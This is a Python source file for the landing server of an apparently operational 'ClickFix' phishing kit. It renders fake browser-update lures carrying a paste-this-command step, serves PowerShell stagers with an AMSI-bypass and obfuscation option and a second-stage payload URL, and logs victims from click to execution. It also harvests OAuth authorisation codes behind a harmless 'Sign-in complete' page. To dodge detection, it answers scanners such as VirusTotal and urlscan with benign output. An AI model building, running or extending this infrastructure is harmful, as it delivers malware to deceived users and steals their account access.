# language: Python 3.11+, file: cf/server.py
# *landing server — lure delivery, stager serving, hit collection*
from __future__ import annotations

import asyncio
import hashlib
import hmac
import json
import logging
import os
from typing import Any
from urllib.parse import urlsplit

from .lure import LureBuilder
from .stager import Stager
from .store import Store
from .techniques import TECHNIQUES

LOG = logging.getLogger("clickfix.server")

PIXEL_GIF = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04"
    b"\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D"
    b"\x01\x00;"
)

DEFAULT_SETTINGS: dict[str, Any] = {
    "kind": "psenc",
    "scenario": "browser_update",
    "locale": "fr",
    "stage2_url": "",
    "stage2_type": "none",
    "amsi": True,
    "continue_url": "https://www.google.com",
}

# headers a third party may push through the cloud relay — anything else
# is dropped before it reaches the client

# ingest secret lives here; set by the CLI from CF_INGEST_KEY at startup
_INGEST_KEY = os.environ.get("CF_INGEST_KEY", "")

# ─── settings cache ──────────────────────────────────────────────────────────
# campaign settings change only through Store.set_campaign_field — key the
# cache on (campaign_id, blake2s(meta)) so one corrupt/changed meta row
# invalidates exactly that campaign, and the per-hit handler never re-parses
_SETTINGS_CACHE: dict[tuple[str, str], dict[str, Any]] = {}


def settings_cache_clear() -> None:
    _SETTINGS_CACHE.clear()


def settings_for(store: Store, campaign: dict[str, Any]) -> dict[str, Any]:
    meta = str(campaign.get("meta") or "")
    key = (str(campaign.get("id", "")), hashlib.blake2s(meta.encode("utf-8")).hexdigest())
    cached = _SETTINGS_CACHE.get(key)
    if cached is not None:
        return cached
    try:
        parsed_meta = json.loads(meta) if meta else {}
        if not isinstance(parsed_meta, dict):
            parsed_meta = {}
    except ValueError:
        # hand-edited/legacy meta in the row must not turn into a 500 on
        # every lure and stager hit — degrade to defaults
        LOG.warning("campaign %s meta is corrupt — using defaults", campaign.get("id"))
        parsed_meta = {}
    merged: dict[str, Any] = dict(DEFAULT_SETTINGS)
    merged.update(parsed_meta)
    merged.setdefault("scenario", campaign.get("scenario") or "browser_update")
    tech = TECHNIQUES.get(str(merged.get("technique", "")))
    if tech:
        if "kind" not in parsed_meta and tech.kind:
            merged["kind"] = tech.kind
        merged["steps"] = list(tech.steps)
    if campaign.get("base_url"):
        merged["base_url"] = campaign["base_url"]
    _SETTINGS_CACHE[key] = merged
    return merged


def normalize_token(raw: str) -> str:
    """`tok`, `tok.gif`, `tok.hta` all address the same target."""
    return raw.split(".")[0]


# uas that never belong to a human pasting a command — sandboxes, scanners,
# url-unfurlers. with filter on, they only ever see the benign /health body.
SCANNER_MARKERS = (
    "python-requests",
    "python-httpx",
    "aiohttp",
    "curl/",
    "wget/",
    "python-urllib",
    "sqlmap",
    "nikto",
    "masscan",
    "zgrab",
    "censys",
    "shodan",
    "virustotal",
    "urlscan",
    "chrome-headless",
    "headlesschrome",
    "phantomjs",
)


def is_scanner(ua: str) -> bool:
    low = (ua or "").lower()
    return any(marker in low for marker in SCANNER_MARKERS)


OAUTH_OK = """<!doctype html><html><head><meta charset="utf-8">
<title>Sign-in complete</title></head>
<body style="font-family:Segoe UI,sans-serif;color:#333">
<p style="margin-top:20vh;text-align:center">Sign-in complete. You can close this window.</p>
</body></html>
"""


class LandingServer:
    """Every route answers a scanner with something benign; a token only
    unlocks content. One instance, one store, structured hit logging."""

    def __init__(
        self,
        store: Store,
        host: str = "127.0.0.1",
        port: int = 8080,
        base_url: str = "",
        default_kind: str = "",
        filter_scanners: bool = False,
    ) -> None:
        from aiohttp import web

        self.web = web
        self.store = store
        self.host = host
        self.port = port
        self.base_url = base_url.rstrip("/")
        self.default_kind = default_kind
        self.filter_scanners = filter_scanners
        self._runner: Any = None
        self._site: Any = None
        self._wide_bind_warned = False

    # ─── url builders ───
    def _loopback(self) -> bool:
        return self.host in ("127.0.0.1", "::1", "localhost")

    def _host_ok(self, origin: str) -> bool:
        """Accept the request's Host only when it matches what we bound.
        A forged Host would otherwise rewrite every stager URL."""
        try:
            parts = urlsplit(origin if "://" in origin else f"http://{origin}")
            req_host = (parts.hostname or "").lower()
            req_port = parts.port
        except ValueError:
            return False
        if not req_host:
            return False
        bound = (self.host or "").lower()
        if bound in ("", "0.0.0.0", "::"):
            # wide bind — we cannot know which address the victim reached;
            # the operator picks base_url for a stable public origin
            return True
        if req_host == bound:
            return req_port is None or req_port == self.port
        if bound == "127.0.0.1" and req_host in ("localhost", "::1"):
            return True
        return False

    def base(self, request: Any = None) -> str:
        if self.base_url:
            return self.base_url
        if request is not None:
            origin = str(request.url.origin())
            if self._host_ok(origin):
                return origin
        return f"http://{self.host}:{self.port}"

    def command_for(
        self, target: dict[str, Any], settings: dict[str, Any], base: str
    ) -> str:
        kind = target.get("meta_kind") or settings.get("kind", "psenc")
        return Stager.command(kind, f"{base}/s/{kind}/{target['token']}")

    def _target_meta(self, target: dict[str, Any]) -> dict[str, Any]:
        try:
            meta = json.loads(target.get("meta") or "{}")
            return meta if isinstance(meta, dict) else {}
        except Exception:  # noqa: BLE001
            return {}

    # ─── off-loop store access ───
    # the single sqlite connection rides a context manager read lock; running
    # it on the event loop thread stalls every other request for the commit
    async def _store(self, fn: Any, *args: Any, **kwargs: Any) -> Any:
        return await asyncio.to_thread(fn, *args, **kwargs)

    def _authenticate(self, request: Any) -> bool:
        """Ingest auth: enforced only on wide binds — a local operator gets
        to keep working without ceremony; anyone off-host must know the key."""
        if self._loopback():
            return True
        expected = _INGEST_KEY
        got = hmac.compare_digest(
            expected.encode("utf-8"),
            (request.headers.get("X-CF-Key", "") or "").encode("utf-8"),
        )
        if got and expected:
            return True
        if not expected and not self._wide_bind_warned:
            self._wide_bind_warned = True
            LOG.warning(
                "bound %s without CF_INGEST_KEY — %s accepting unauthenticated ingest",
                self.host,
                "still" if self._loopback() else "NOT",
            )
        return False

    # ─── routes ───
    async def root(self, request: Any) -> Any:
        return self.web.json_response({"status": "ok"})

    async def health(self, request: Any) -> Any:
        return self.web.json_response({"status": "up"})

    async def lure(self, request: Any) -> Any:
        web = self.web
        token = request.match_info["token"]
        target = await self._store(self.store.get_target, token)
        if not target:
            return web.Response(status=404, text="not found")
        campaign = await self._store(self.store.get_campaign, target["campaign_id"]) or {}
        settings = settings_for(self.store, campaign)
        base = self.base(request)
        command = self.command_for(
            {**target, "meta_kind": self._target_meta(target).get("kind")},
            settings,
            base,
        )
        html = LureBuilder.render(
            settings["scenario"],
            token=token,
            command=command,
            continue_url=settings["continue_url"],
            locale=settings["locale"],
            steps=settings.get("steps"),
        )
        await self._store(
            self.store.record_hit,
            token,
            "lure",
            ip=request.remote or "",
            ua=request.headers.get("User-Agent", ""),
            referer=request.headers.get("Referer", ""),
        )
        self._advance(target, "clicked")
        return web.Response(
            text=html,
            content_type="text/html",
            headers={"Cache-Control": "no-store, max-age=0", "X-Robots-Tag": "noindex"},
        )

    async def stager(self, request: Any) -> Any:
        web = self.web
        kind = request.match_info["kind"]
        token = normalize_token(request.match_info["token"])
        target = await self._store(self.store.get_target, token)
        if not target:
            return web.Response(status=404, text="not found")
        campaign = await self._store(self.store.get_campaign, target["campaign_id"]) or {}
        settings = settings_for(self.store, campaign)
        base = self.base(request)
        tmeta = self._target_meta(target)
        hit_url = f"{base}/hit/{token}"
        try:
            content_type, body = Stager.loader(
                kind,
                token=token,
                hit_url=hit_url,
                stage2_url=tmeta.get("stage2_url", settings["stage2_url"]),
                stage2_type=tmeta.get("stage2_type", settings["stage2_type"]),
                amsi=bool(tmeta.get("amsi", settings["amsi"])),
                obfuscate=bool(tmeta.get("obfuscate", settings.get("obfuscate", False))),
            )
        except ValueError as exc:
            return web.Response(status=400, text=str(exc))
        await self._store(
            self.store.record_hit,
            token,
            f"stager:{kind}",
            ip=request.remote or "",
            ua=request.headers.get("User-Agent", ""),
        )
        self._advance(target, "delivered")
        return web.Response(
            text=body,
            content_type=content_type.split(";")[0],
            charset="utf-8",
            headers={"Cache-Control": "no-store"},
        )

    async def pixel(self, request: Any) -> Any:
        token = normalize_token(request.match_info["token"])
        if await self._store(self.store.get_target, token):
            await self._store(
                self.store.record_hit,
                token,
                "pixel",
                ip=request.remote or "",
                ua=request.headers.get("User-Agent", ""),
                referer=request.headers.get("Referer", ""),
            )
        return self.web.Response(
            body=PIXEL_GIF,
            content_type="image/gif",
            headers={"Cache-Control": "no-store"},
        )

    async def hit(self, request: Any) -> Any:
        token = request.match_info["token"]
        target = await self._store(self.store.get_target, token)
        if not target:
            return self.web.Response(status=404)
        stage = request.query.get("s", "exec")
        await self._store(
            self.store.record_hit,
            token,
            f"hit:{stage}",
            ip=request.remote or "",
            ua=request.headers.get("User-Agent", ""),
            extra={"stage": stage},
        )
        if stage in ("exec", "run"):
            self._advance(target, "executed")
        return self.web.Response(status=204)

    async def ext_ingest(self, request: Any) -> Any:
        if not self._authenticate(request):
            return self.web.json_response({"ok": False, "error": "unauthorized"}, status=401)
        try:
            payload = await request.json()
        except Exception:  # noqa: BLE001
            return self.web.json_response({"ok": False}, status=400)
        events = payload.get("events") if isinstance(payload, dict) else None
        if not isinstance(events, list) or not events:
            return self.web.json_response({"ok": False}, status=400)
        device = str(payload.get("id", ""))[:64]
        await self._store(
            self.store.log_event,
            "",
            "",
            "ext_events",
            json.dumps(
                {"device": device, "count": len(events), "events": events[:50]},
                ensure_ascii=False,
                default=str,
            )[:3000],
        )
        return self.web.json_response({"ok": True, "accepted": len(events)})

    async def results(self, request: Any) -> Any:
        if not self._authenticate(request):
            return self.web.json_response({"ok": False, "error": "unauthorized"}, status=401)
        try:
            payload = await request.json()
        except Exception:  # noqa: BLE001
            return self.web.json_response({"ok": False}, status=400)
        token = str(payload.get("token", ""))
        data = payload.get("data", payload)
        target = await self._store(self.store.get_target, token) if token else None
        if target:
            self._advance(target, "executed")
        await self._store(
            self.store.log_event,
            token,
            target["campaign_id"] if target else "",
            "result",
            json.dumps(data, ensure_ascii=False, default=str)[:3000],
        )
        return self.web.json_response({"ok": True})

    async def oauth(self, request: Any) -> Any:
        """Consent-grant landing: the provider bounces the victim here with
        ?code=...&state=<token>. We log the auth code and look innocent."""
        from .access import parse_callback

        params = parse_callback(dict(request.query))
        token = params.get("state", "")
        ua = request.headers.get("User-Agent", "")
        ip = request.remote or ""
        target = await self._store(self.store.get_target, token) if token else None
        if target:
            await self._store(
                self.store.record_hit,
                token,
                "oauth:code",
                ip=ip,
                ua=ua,
                extra={"error": params.get("error", "")},
            )
            self._advance(target, "executed")
        else:
            await self._store(
                self.store.log_event,
                token,
                target["campaign_id"] if target else "",
                "oauth:code",
                json.dumps(params, ensure_ascii=False)[:1000],
            )
        return self.web.Response(
            text=OAUTH_OK,
            content_type="text/html",
            headers={"Cache-Control": "no-store"},
        )

    def _advance(self, target: dict[str, Any], status: str) -> None:
        # funnel order — the stager (delivered) only answers a click
        order = ["created", "lured", "clicked", "delivered", "executed"]
        current = str(target.get("status", "created"))
        if status in order and current in order:
            if order.index(status) > order.index(current):
                try:
                    self.store.set_status(target["token"], status)
                except Exception as exc:
                    LOG.warning("status advance failed for %s: %s", target["token"], exc)

    # ─── app ───
    def _ua_filter_middleware(self) -> Any:
        """Factory returning the scanner-filter middleware (aiohttp style)."""

        @self.web.middleware
        async def filter_mw(request: Any, handler: Any) -> Any:
            if self.filter_scanners and is_scanner(request.headers.get("User-Agent", "")):
                await self._store(
                    self.store.log_event,
                    "",
                    "",
                    "ua_filter",
                    json.dumps(
                        {
                            "ua": request.headers.get("User-Agent", "")[:120],
                            "path": request.path,
                            "ip": request.remote or "",
                        }
                    )[:500],
                )
                return self.web.json_response(
                    {"status": "ok"},
                    headers={"Cache-Control": "no-store"},
                )
            return await handler(request)

        return filter_mw

    def build_app(self) -> Any:
        web = self.web
        app = web.Application(
            client_max_size=1 << 20,
            middlewares=[self._ua_filter_middleware()],
        )
        app.router.add_get("/", self.root)
        app.router.add_get("/health", self.health)
        app.router.add_get("/l/{token}", self.lure)
        app.router.add_get("/s/{kind}/{token}", self.stager)
        app.router.add_get("/t/{token}", self.pixel)
        app.router.add_get("/t/{token}.gif", self.pixel)
        app.router.add_get("/hit/{token}", self.hit)
        app.router.add_get("/oauth/cf", self.oauth)
        app.router.add_post("/ext/ingest", self.ext_ingest)
        app.router.add_post("/api/v1/results", self.results)
        return app

    async def start(
        self,
        ssl_certfile: str | None = None,
        ssl_keyfile: str | None = None,
    ) -> None:
        from aiohttp import web

        if self._runner is not None:
            # a second start() must not orphan the first bound site
            await self.stop()
        app = self.build_app()
        self._runner = web.AppRunner(app, access_log=None)
        await self._runner.setup()
        ssl_context = None
        if ssl_certfile and ssl_keyfile:
            import ssl

            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context.load_cert_chain(ssl_certfile, ssl_keyfile)
        self._site = web.TCPSite(
            self._runner, self.host, self.port, ssl_context=ssl_context
        )
        try:
            await self._site.start()
        except OSError:
            await self._runner.cleanup()
            self._runner = None
            self._site = None
            raise
        if not self._loopback():
            LOG.warning(
                "bound %s:%d — off-host ingest %s (set CF_INGEST_KEY)",
                self.host,
                self.port,
                "key-protected" if _INGEST_KEY else "UNPROTECTED",
            )
        scheme = "https" if ssl_context else "http"
        LOG.info("listening on %s://%s:%d", scheme, self.host, self.port)

    async def stop(self) -> None:
        if self._runner is not None:
            await self._runner.cleanup()
        self._runner = None
        self._site = None

    async def serve_forever(
        self,
        ssl_certfile: str | None = None,
        ssl_keyfile: str | None = None,
    ) -> None:
        await self.start(ssl_certfile, ssl_keyfile)
        stop = asyncio.Event()
        try:
            import signal

            for sig in (signal.SIGINT, signal.SIGTERM):
                asyncio.get_running_loop().add_signal_handler(sig, stop.set)
        except (NotImplementedError, RuntimeError, OSError):
            pass  # windows: ctrl+c raises KeyboardInterrupt instead
        print(
            f"clickfix serving on http://{self.host}:{self.port} — ctrl+c to stop"
        )
        try:
            await stop.wait()
            await self.stop()
        finally:
            await self.stop()
